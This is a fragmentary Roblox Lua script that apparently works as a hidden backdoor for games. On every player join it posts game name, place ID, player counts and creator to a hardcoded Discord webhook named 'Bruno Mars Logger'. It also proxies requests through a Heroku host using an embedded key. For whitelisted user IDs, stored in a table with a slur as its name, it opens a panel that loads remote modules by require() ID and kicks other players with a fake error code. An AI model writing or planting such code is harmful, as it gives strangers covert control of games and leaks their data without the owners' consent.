...
local Proxy = ProxyService:New('https://dududude.herokuapp.com', 'f505001acca1bd7db7f3bf9989be5c030ba1d82862e16ff62af9f4eb9dba2cde')
local img = game:GetService("HttpService"):JSONDecode(Proxy:Get("https://thumbnails.roblox.com/v1/games/icons?universeIds="..tostring(game.GameId).."&size=512x512&format=Png&isCircular=false").body)
...
game.Players.PlayerAdded:Connect(function(player)
	wait()
	game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1000595667057660077/yqIoUP2m9Hl7AN2_WmOKdmLTZIxC15niYfT0vpffqXfR0BHwBVvZTM_43X1aGzxg6fVc",game:GetService("HttpService"):JSONEncode(
	{
		["username"] = "Bruno Mars Logger",
		["avatar_url"] = "https://cdn.discordapp.com/attachments/929059812862472262/1000479769604915311/Png_1.png",
		["embeds"] = {{
			["title"] = GameInfo.Name,
			['description'] = "[https://www.roblox.com/games/"..game.PlaceId.."](https://www.roblox.com/games/"..game.PlaceId..")",
			["url"] = "https://roblox.com/games/"..tostring(game.PlaceId),
			["color"] = math.random(0, 16777215),
			["fields"] = {{
				["name"] = "Players",
				["value"] = "``"..tostring(#game:GetService("Players"):GetChildren()).."/"..tostring(game:GetService("Players").MaxPlayers).."``",
				["inline"] = true,
			}, {
				["name"] = "Creator",
				["value"] = "``"..tostring(game:GetService("Players"):GetNameFromUserIdAsync(gameOwner)).."``",
				["inline"] = true,
			}, {
				["name"] = "Place ID",
			...
			["footer"] = {
				["text"] = "Possible by Lego Person#6949 | Fixed by Fyr0s#0001",
				["icon"] = "https://cdn.discordapp.com/attachments/929059812862472262/1000479769604915311/Png_1.png"
			},
	...
	if table.find(retards, player.UserId) then
		...
		local scrips = Instance.new("Frame")
		...
		Main.Draggable = true
		Main.Position = UDim2.new(0.258265615, -86, 0.268776208, -21)
		...
		local hy = script.Main.Bloom:Clone()
		hy.Disabled = false
		hy.Parent = _1
		...
		_3.Font = Enum.Font.Roboto
		_3.Text = "SpringHub"
		_3.TextColor3 = Color3.fromRGB(0, 0, 0)
		_3.TextSize = 14.000
		_3:SetAttribute("script","require(5687081949).SpringHub('"..player.Name.."')")
		local gy = script.Main.Bloom:Clone()
		gy.Disabled = false
		gy.Parent = _3
		...
		scrips.Name = "scrips"
		scrips.Parent = Main
		scrips.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
		scrips.BorderSizePixel = 0
		scrips.Position = UDim2.new(0.00400000019, 0, 0.0909999982, 0)
		scrips.Size = UDim2.new(0, 520, 0, 241)
...
Remote.OnServerEvent:Connect(function(player,ss)
	if table.find(retards, player.UserId) then
		...
		player:Kick("You have been kicked due to unexpected client behavior.	(Error Code: 268)")
	end
end)
